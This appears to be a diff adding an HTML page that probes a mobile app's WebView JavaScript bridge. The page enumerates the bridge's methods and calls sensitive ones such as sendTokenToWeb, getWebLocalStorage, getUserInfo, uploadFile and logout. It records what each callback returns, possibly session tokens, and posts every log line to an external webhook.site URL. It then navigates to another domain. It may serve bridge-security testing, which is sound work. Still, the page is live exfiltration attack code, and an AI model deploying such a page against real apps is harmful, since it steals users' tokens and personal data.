@@ -1,0 +1,35 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>BGV</title></head>
+<body style="font:13px monospace;white-space:pre-wrap;color:#000;background:#fff">
+<div id="out">boot</div>
+<script>
+var L=[],t0=Date.now();
+function T(){return "+"+((Date.now()-t0)/1000).toFixed(1)+"s";}
+function log(s){L.push(T()+" "+s);document.getElementById('out').textContent=L.join("\n");
+ try{fetch("https://webhook.site/ab07c8f2-ee3f-45ac-9369-da34f519f217",{method:"POST",mode:"no-cors",body:T()+" "+s});}catch(e){}}
+log("HOST="+location.host);
+log("BRIDGE="+(!!window.control)+" APICNT="+(window.control?Object.keys(control).length:0));
+if(window.control) log("APIS="+Object.keys(control).join(","));
+var pending={};
+function mk(api){var f="cb_"+api;window[f]=function(d){pending[api]=true;
+  log("CALLBACK["+api+"]="+(typeof d=="string"?d.slice(0,300):JSON.stringify(d).slice(0,300)));};return f;}
+setTimeout(function(){
+ if(!window.control){log("no bridge");return;}
+ function call(api,arg){if(typeof control[api]!=="function"){log("MISSING "+api);return;}try{control[api](arg);log("CALL "+api);}catch(e){log("THROW "+api+" "+e);}}
+ call("sendTokenToWeb",mk("sendTokenToWeb"));
+ call("getWebLocalStorage",JSON.stringify({key:"k",callbackFun:mk("getWebLocalStorage")}));
+ call("getInviteFriends",mk("getInviteFriends"));
+ call("getAppUsdtRateData",mk("getAppUsdtRateData"));
+ call("getNavigationBarHide",mk("getNavigationBarHide"));
+ call("requestAction",JSON.stringify({path:"/v1/social/userInfo/getUserInfo",params:{},requestId:mk("requestAction")}));
+ call("uploadFile",JSON.stringify({url:"/v1/common/upload",callbackFun:mk("uploadFile")}));
+ call("requestPostAction",JSON.stringify({url:"/v1/common/upload",callbackFun:mk("requestPostAction")}));
+ call("logout",mk("logout"));
+ setTimeout(function(){
+   log("=== 9s VERDICT ===");
+   ["sendTokenToWeb","getWebLocalStorage","getInviteFriends","getAppUsdtRateData","getNavigationBarHide","requestAction","uploadFile","requestPostAction","logout"].forEach(function(a){
+     log((pending[a]?"ALLOWED  ":"REJECTED ")+a);});
+   log("=== end verdict ===");
+ },9000);
+},600);
+setTimeout(function(){log("CROSSDOMAIN nav -> example.org");location.href="https://example.org/?r2="+Date.now();},17000);
+</script></body></html>
